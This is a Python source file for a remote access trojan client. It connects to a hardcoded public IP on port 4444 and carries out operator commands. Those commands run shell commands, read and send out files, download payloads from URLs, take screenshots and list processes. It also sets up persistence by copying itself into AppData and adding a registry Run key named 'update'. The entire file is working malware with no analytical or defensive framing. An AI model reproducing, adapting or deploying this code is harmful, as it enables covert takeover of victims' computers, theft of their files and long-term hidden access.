import socket
import threading

import getpass
import platform
import os
import subprocess

HOST = '87.246.55.250'  # server IP address
PORT = 4444             # server port
BUFFER = 1024 * 128 * 1000
FORMAT = 'ascii'

UPLOADED_SUCCESSFUL = False

if platform.platform()[0:7] == 'Windows':
    system = platform.platform()[0:10]
elif platform.platform()[0:5] == 'Linux':
    system = 'Linux'
else: system = 'unknown'

import random
randchars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
addchars = ""
for char in range(20):
    addchars += random.choice(randchars)
nickname = '(' + getpass.getuser() + '/' + system + ')' + '~' + socket.getfqdn(socket.gethostname()).strip() + f'-{addchars}'


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))


def receive():
    global UPLOADED_SUCCESSFUL  # used to give enough verbose when the admin is uploading a file
    while True:
        try:
            message = client.recv(BUFFER).decode(FORMAT)
            if message == 'NICK':
                client.send(nickname.encode(FORMAT))


            else:
                msg = message.split(" ")
                if msg[0] == 'program-command-for-interaction':
                    msg = '|*|*|' + socket.getfqdn(socket.gethostname()).strip() + '/' + getpass.getuser() + f'({system})'  # The message contains a header '|*|*|'. This is used to retrieve the user's information
                    sendBox(msg)


                elif msg[0] == 'whoami':
                    msg = '\n' + socket.getfqdn(socket.gethostname()).strip()+ '\n'
                    sendBox(msg)
                
                elif msg[0] == 'cd':
                    try:
                        if msg[1] == '..':
                            dir = ""
                            count_cd = 0
                            for d in range(len(os.getcwd().split("\\")[0:-1])):
                                dir += (os.getcwd().split("\\")[count_cd]) + '\\'
                                count_cd += 1
                            try:
                                os.chdir(dir[0:-1])
                                sendBox(f'\n{dir[0:-1]}\n')
                            except: sendBox('\n[-] Folder not found\n')
                        elif msg[1][0] == '"' or msg[1][0] == "'":  # if the command = <    cd "C:\User1\Desktop"    > (with quotes)
                            msg_lenght = len(msg) - 1
                            dir = ""
                            count_cd = 1
                            for m in range(msg_lenght):
                                dir += msg[count_cd] + ' '
                                count_cd += 1
                            dir = dir[1:-2]
                            try:
                                os.chdir(dir)
                                sendBox(f'\n{os.getcwd()}\n')
                            except: sendBox('\n[-] Folder not found\n')
                        else:
                            try:
                                os.chdir(msg[1])
                                sendBox(f'\n{os.getcwd()}\n')
                            except: sendBox('\n[-] Folder not found\n')

                    except: sendBox(f'\n{os.getcwd()}\n')  # if "cd" has no arguments - prints the current directory

                elif msg[0] == 'dget':
                    import requests
                    def download_f(url, name):
                        try:
                            if name:
                                pass
                            else:
                                name = req.url[url.rdfind("/")+1:]

                            with requests.get(url) as req:
                                with open(name, 'wb') as f:
                                    for chunk in req.iter_content(chunk_size=8192):
                                        if chunk:
                                            f.write(chunk)
                                return name
                        except Exception as error_info:
                            return error_info
                    try:
                        download_f(msg[1], msg[2])
                        msg = '\n[+] Download successful\n' + f'[i] File downloaded from: {msg[1]}\n' + f'[*] File saved in: {os.getcwd()}\n'
                    except IndexError:
                        msg = '\n[-] Error occurred\n' + f'[i] Tip: dget <url> <filename.txt>\n' + '[@] Help: type "help dget"\n'
                    sendBox(msg)


                elif msg[0] == 'download':
                    def read_file(path): # download
                        try:
                            with open(path, 'r') as file:  # normally 'rb' (read as binary) but since sendBox() converts it to bytes it's fine
                                return file.read()
                        except:
                            return '\n[-] File not found\n'

                    try:
                        msg = '|d0wnl0ad-msg-head3r|' + read_file(msg[1])  # this message contains a headear that tells the admin to download the file
                    except:
                        msg = "\n[-] No arguments were specified\n"  # if there is an IndexError, and the message contains no arguments
                    sendBox(msg)


                elif msg[0] == 'cat':
                    def read_file(path):
                        try:
                            with open(path, 'r') as file:
                                return file.read()
                        except:
                            return '[-] File not found\n'
                    try:
                        msg = read_file(msg[1])
                    except:
                        msg = "\n[-] No arguments were specified\n"  # if there is an IndexError, and the message contains no arguments
                    sendBox(msg)


                elif msg[0] == 'idletime':
                    from ctypes import Structure, windll, c_uint, sizeof, byref
                    class LASTINPUTINFO(Structure):
                        _fields_ = [
                            ('cbSize', c_uint),
                            ('dwTime', c_uint),
                        ]
                    def get_idle_duration():
                        lastInputInfo = LASTINPUTINFO()
                        lastInputInfo.cbSize = sizeof(lastInputInfo)
                        windll.user32.GetLastInputInfo(byref(lastInputInfo))
                        millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                        return millis / 1000.0
                    idletime = get_idle_duration()
                    msg = f'\nIdletime: {idletime} seconds\n'
                    sendBox(msg)


                elif msg[0] == 'pc':
                    import shutil, sys
                    def rg_add():
                        try:
                            file_location = os.environ['appdata'] + "\\app.exe"
                            if not os.path.exists(file_location):
                                file_name = 'update'
                                shutil.copyfile(sys.executable, file_location)
                                subprocess.call(f'reg add HKCU\\Software\\Microsoft\\CurrentVersion\\Run /v {file_name} /t REG_SZ /d "' + file_location + '"', shell=True)
                                return '\n[+] Success\n'
                        except: return '\n[-] Error occurred\n'
                    msg = rg_add()
                    sendBox(msg)


                elif msg[0] == 'pss':
                    import wmi
                    processes = ""
                    label = "pid        Process name"
                    if platform.platform()[0:7] == 'Windows':
                        f = wmi.WMI()
                        for process in f.Win32_Process():
                            processes += f"{process.ProcessId:<10} {process.Name}\n"
                    msg  = f'\n{label}\n\n{processes}'
                    sendBox(msg)


                elif msg[0] == 'pysh': pass


                elif msg[0] == 'src':
                    import pyautogui
                    try:
                        def take_src(directory):
                            global img_file_name, path, DIR
                            DIR = directory
                            chars = '1234567890asdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
                            img_file_name = 'screenshot-'
                            for r in range(20):
                                img_file_name += random.choice(chars)
                            img_file_name += '.png'
                            if platform.platform()[0:7] == 'Windows':
                                path = directory + '\\' + img_file_name
                            else:
                                path = directory + '/' + img_file_name
                            pyautogui.screenshot(path)
                        try:
                            save_in = msg[1]
                            already_printed_cwd = False
                        except IndexError:
                            save_in = os.getcwd()
                            already_printed_cwd = True
                        take_src(save_in)
                        cwd_var = os.getcwd()
                        if save_in == '..':
                            cwd_var = cwd_var.split("\\")
                            cwd_var = cwd_var[0:-1]
                            place = ''
                            for i in cwd_var:
                                place += i
                                place += '\\'
                            cwd_var = place[0:-1]
                        else:
                            if already_printed_cwd != True:
                                cwd_ = os.getcwd()
                            else:
                                already_printed_cwd = False
                                cwd_ = ''
                            cwd_var = cwd_ + '\\' + save_in
                        msg = '\n[+] Screenshot successful\n' + f'[i] Saved as: {img_file_name}\n' + f'[*] Saved In: {cwd_var}\n'
                    except FileNotFoundError:
                        msg = f'\n[-] Folder not found: {DIR}\n'
                    except:
                        msg = '\n[-] Error occurred\n'
                    sendBox(msg)


                elif msg[0] == 'time':
                    import datetime
                    now__ = datetime.datetime.now()
                    ctime__ = now__.strftime("%H:%M:%S.%f")
                    msg = f'[@] Client: {ctime__}\n'
                    sendBox(msg)


                elif msg[0] == 'upload':
                    with open(msg[1], 'w') as file:  # msg[1] = filename
                        # print(f'Filename: {msg[1]}\nContents: {msg[2:]}') for debugging
                        save_from_lenght = len(msg[0]) + len(msg[1]) + 2  # +2 for the two spaces
                        save_ = message[save_from_lenght:]
                        file.write(save_)  # msg[2:] = file contents, it must be str
                        file.close()
                        UPLOADED_SUCCESSFUL = True
                    sendBox(f'\n[i] File {msg[1]} was saved in: {os.getcwd()}\n')


                else:
                    if msg[0] == 'exec':
                        try:
                            msg = subprocess.check_output(msg[1:], shell=True)  # if this cause no error msg stays as a byte => later it is getting decoded to be send
                        except subprocess.CalledProcessError:        
                            msg = b'\n[-] Failure\n'  # if it's an error message => msg converts into a byte to be send
                        sendBox(msg.decode(FORMAT))  # msg is a byte = already encoded; so decoding is needed; because this function will encode it. (it cannot be encoded twice!!!)
                    else:
                        if UPLOADED_SUCCESSFUL != True:  # If it is not true and the executed command is "upload" the next line will be executed for each line in the uploaded file. This is prevented from hapenning
                            sendBox('\n[-] This command does not exist\n')
                        UPLOADED_SUCCESSFUL = False  # sets it to default

        except Exception as failure:
            try: sendBox(f'\n[-] Error occurred - {failure}\n')
            except: client.close()
            break

def sendBox(message):  # this is the function to send the message, when the server receive it => it will be send to the admin
    client.send(message.encode(FORMAT))
        

receive_thread = threading.Thread(target=receive)
receive_thread.start()






